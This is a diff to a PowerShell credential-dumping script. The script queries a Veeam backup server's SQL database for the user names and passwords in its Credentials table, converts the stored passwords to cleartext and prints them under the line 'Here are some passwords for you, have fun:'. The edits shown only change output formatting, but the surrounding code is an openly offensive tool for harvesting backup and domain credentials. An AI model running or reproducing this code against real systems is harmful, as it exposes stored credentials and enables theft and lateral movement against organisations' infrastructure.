@@ -23,7 +23,8 @@ catch {
 	exit -1
 }
 
-"Found Veeam DB on "+$SqlServerName+"\"+$SqlInstanceName+"@"+$SqlDatabaseName+" connecting..."
+""
+Write-Host "Found Veeam DB on "+$SqlServerName+"\"+$SqlInstanceName+"@"+$SqlDatabaseName+" connecting...  " -NoNewLine
 
 #Forming the connection string
 $SQL = "SELECT [user_name],[password] FROM [$SqlDatabaseName].[dbo].[Credentials] "+
@@ -47,6 +48,8 @@ catch {
 	exit -1
 }
 
+"Done"
+
 $rows=($dataset.Tables | Select-Object -Expand Rows)
 if ($rows.count -eq 0) {
 	"No passwords today, sorry."
@@ -61,5 +64,8 @@ $rows | ForEach-Object -Process {
 	$_.password = $enc.GetString($ClearPWD)
 	
 }
-"Here are some passwords for you, have fun:"
+
+""
+"Here are some passwords for you, have fun:" 
 $rows
+""
